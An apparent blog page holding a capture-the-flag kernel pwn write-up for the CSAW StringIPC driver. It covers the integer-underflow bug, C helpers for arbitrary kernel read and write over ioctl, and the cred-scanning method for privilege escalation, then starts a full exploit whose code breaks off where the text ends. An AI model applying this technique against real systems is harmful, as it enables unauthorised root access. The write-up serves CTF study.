<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/18/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/18/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/08/cred%20attack+vdso%20attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/08/cred%20attack+vdso%20attack/" class="post-title-link" itemprop="url">cred attack+vdso attack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-10-08 22:25:14 / Modified: 22:29:34" itemprop="dateCreated datePublished" datetime="2022-10-08T22:25:14+08:00">2022-10-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>16k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>14 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>StringIPC 复现</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512 \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append &quot;console=ttyS0 root=/dev/ram rdinit=/sbin/init&quot; \</span><br><span class="line">    -nographic \</span><br><span class="line">    -s \</span><br><span class="line">    -cpu qemu64,+smep,+smap \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 </span><br></pre></td></tr></table></figure>
<ul>
<li>smep，smap（这是我自己加的，原题没有）</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/sh</span></span><br><span class="line">/bin/mount -a</span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t tmpfs -o size=64k,mode=0755 tmpfs /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">sysctl -w kernel.hotplug=/sbin/mdev</span><br><span class="line">ifconfig lo 127.0.0.1 netmask 255.255.255.0</span><br><span class="line">route add -net 127.0.0.0 netmask 255.255.255.0 lo</span><br><span class="line">insmod StringIPC.ko # 驱动模块</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">echo &quot;man, you got me&quot; &gt; flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">chmod 766 /dev/csaw</span><br><span class="line">nohup /sudo_timer &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<p>和 <code>qwb2018-solid_core</code> 的漏洞点一样：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf_size = channel-&gt;buf_size;</span><br><span class="line">ch1 = buf_size + id;</span><br><span class="line">ch2 = buf_size - id;</span><br><span class="line"><span class="keyword">if</span> ( !key_s )</span><br><span class="line">    ch1 = ch2;</span><br><span class="line">data = (<span class="keyword">char</span> *)krealloc(channel-&gt;data, ch1 + <span class="number">1</span>, <span class="number">0x24000C0</span>LL);</span><br></pre></td></tr></table></figure>
<ul>
<li>CSAW_SHRINK_CHANNEL 会导致 <code>ch2</code> 负数溢出为“-1”</li>
<li><code>krealloc(channel-&gt;data, 0, 0x24000C0LL)</code> 返回“0”，使后面的 <code>channel-&gt;data = 0</code>，而 <code>channel-&gt;buf_size</code> 非常大  </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">channel-&gt;data = data;</span><br><span class="line">channel-&gt;buf_size = ch1;</span><br></pre></td></tr></table></figure>
<ul>
<li>进而绕过后面的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( channel_from.size + index_write &gt; channel_write-&gt;buf_size )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_29;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>在 <code>qwb2018-solid_core</code> 中，作者禁用了 “cred attack” 和 “vdso attack” 这两种方法，这里就来试一试</p>
<p>首先 WAA，RAA 的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span> *read_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_channel</span>;</span></span><br><span class="line"></span><br><span class="line">    seek_channel.id = channel_id;</span><br><span class="line">    seek_channel.index = addr<span class="number">-0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = channel_id;</span><br><span class="line">    read_channel.buf = (<span class="keyword">char</span>*)read_buff;</span><br><span class="line">    read_channel.count = len;</span><br><span class="line">    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_channel);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WAA</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> channel_id, <span class="keyword">void</span>* write_buff, <span class="keyword">uint64_t</span> addr, <span class="keyword">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_channel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_channel</span>;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        seek_channel.id = channel_id;</span><br><span class="line">        seek_channel.index = addr<span class="number">-0x10</span>+i;</span><br><span class="line">        seek_channel.whence = SEEK_SET;</span><br><span class="line">        ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_channel);</span><br><span class="line"></span><br><span class="line">        write_channel.id = channel_id;</span><br><span class="line">        write_channel.buf = (<span class="keyword">char</span>*)write_buff+i;</span><br><span class="line">        write_channel.count = <span class="number">1</span>;</span><br><span class="line">        ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_channel);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：由于驱动使用的 <code>strncpy_from_user</code> 会被 “\x00” 截断，所以 WAA 最好单字节多次输入</li>
</ul>
<p>Cred Attack：</p>
<p>内核结构体 <code>task_struct</code> 用于对进程/线程的所有的相关的信息进行维护，并进行管理：</p>
<ul>
<li>其中有个很重要的条目就是 <code>*cred</code> 指针，内核会根据 <code>cred</code> 结构体的内容来判断一个进程拥有的权限（如果 <code>cred</code> 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限）</li>
<li>想要定位 <code>task_struct</code> 结构体中的 <code>cred</code> 指针，需要用到 <code>task_struct</code> 中的另一个条目 <code>comm[TASK_COMM_LEN]</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>		*<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * executable name, excluding path.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment"> * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment"> * - lock it with task_lock()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">char</span>				comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure>
<ul>
<li><code>comm</code> 字符数组就在 <code>*cred</code> 相邻的下方，里面存放的这个字符串表示线程的名字（可以唯一确定），其内容可以通过 linux 的 <code>prctl(PR_SET_NAME,name)</code> 来设置指定的值</li>
<li><code>*real_cred</code> 和 <code>*cred</code> 的值相同，可以用于判断是否找到 <code>*cred</code></li>
<li>如果程序拥有局部 RAA，就可以通过扫描 <code>comm</code> 来找到 <code>*cred</code></li>
</ul>
<p>最后还需要确定一下扫描的范围： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffffffffffff</span>  ---+-----------+----------------------------------------------</span><br><span class="line">    <span class="number">8</span>M                 |           | unused hole                                   </span><br><span class="line"><span class="number">0xffffffffff7ff000</span>  ---|-----------+------------| FIXADDR_TOP |-------------------</span><br><span class="line">    <span class="number">1</span>M                 |           |                                               </span><br><span class="line"><span class="number">0xffffffffff600000</span>  ---+-----------+------------| VSYSCALL_ADDR |-----------------</span><br><span class="line">    <span class="number">548</span>K               |           | vsyscalls                                    </span><br><span class="line"><span class="number">0xffffffffff577000</span>  ---+-----------+------------| FIXADDR_START |-----------------</span><br><span class="line">    <span class="number">5</span>M                 |           | hole                                         </span><br><span class="line"><span class="number">0xffffffffff000000</span>  ---+-----------+------------| MODULES_END |------------------- </span><br><span class="line">    <span class="number">1520</span>M              |           | <span class="function"><span class="keyword">module</span> mapping <span class="title">space</span> <span class="params">(MODULES_LEN)</span>           </span></span><br><span class="line"><span class="function">0xffffffffa0000000  ---+-----------+------------| MODULES_VADDR |-----------------</span></span><br><span class="line"><span class="function">    512M               |           | kernel text mapping, from phys 0         </span></span><br><span class="line"><span class="function">0xffffffff80000000  ---+-----------+------------| __START_KERNEL_map |------------</span></span><br><span class="line"><span class="function">    2G                 |           | hole                                 </span></span><br><span class="line"><span class="function">0xffffffff00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    64G                |           | EFI region mapping space                     </span></span><br><span class="line"><span class="function">0xffffffef00000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    444G               |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffff8000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | %esp fixup stacks                             </span></span><br><span class="line"><span class="function">0xffffff0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    3T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xfffffc0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    16T                |           | kasan shadow <span class="title">memory</span> <span class="params">(<span class="number">16</span>TB)</span>                   </span></span><br><span class="line"><span class="function">0xffffec0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffeb0000000000  ---+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">    1T                 |           | <span class="keyword">virtual</span> memory <span class="built_in">map</span> <span class="keyword">for</span> all of struct pages   </span></span><br><span class="line"><span class="function">0xffffea0000000000  ---+-----------+------------| VMEMMAP_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                        </span></span><br><span class="line"><span class="function">0xffffe90000000000  ---+-----------+------------| VMALLOC_END   |-----------------</span></span><br><span class="line"><span class="function">    32T                |           | vmalloc/<span class="title">ioremap</span> <span class="params">(<span class="number">1</span> &lt;&lt; VMALLOC_SIZE_TB)</span>       </span></span><br><span class="line"><span class="function">0xffffc90000000000  ---+-----------+------------| VMALLOC_START |-----------------</span></span><br><span class="line"><span class="function">    1T                 |           | hole                                         </span></span><br><span class="line"><span class="function">0xffffc80000000000  ---+-----------+---------------------------------------------- </span></span><br><span class="line"><span class="function">    64T                |           | direct mapping of all phys. memory           </span></span><br><span class="line"><span class="function">                       |           | <span class="params">(<span class="number">1</span> &lt;&lt; MAX_PHYSMEM_BITS)</span>                       </span></span><br><span class="line"><span class="function">0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | ------------</span></span><br><span class="line"><span class="function">    8T                 |           | guard hole, reserved <span class="keyword">for</span> hypervisor           </span></span><br><span class="line"><span class="function">0xffff800000000000 ----+-----------+----------------------------------------------</span></span><br><span class="line"><span class="function">                       |-----------| hole caused by [48:63] sign extension   </span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000800000000000</span> ----+-----------+----------------------------------------------</span><br><span class="line">    PAGE_SIZE          |           | guard page                                   </span><br><span class="line"><span class="number">0x00007ffffffff000</span> ----+-----------+--------------| TASK_SIZE_MAX | -------------- </span><br><span class="line">    <span class="number">128</span>T               |           | different per mm                            </span><br><span class="line"><span class="number">0x0000000000000000</span> ----+-----------+----------------------------------------------</span><br></pre></td></tr></table></figure>
<ul>
<li>直接映射区：0xffff880000000000 ~ 0xffffc80000000000（使用 kmalloc，分配的内存物理地址是连续的，虚拟地址也是连续的）</li>
<li>动态映射区：0xffffc90000000000 ~ 0xffffe90000000000（使用 vmalloc，分配的内存物理地址是不连续的，虚拟地址是连续的）</li>
<li>PS：<code>cred</code> 使用直接映射区</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_IOCTL_BASE     0x77617363</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> buf_size;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">grow_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span 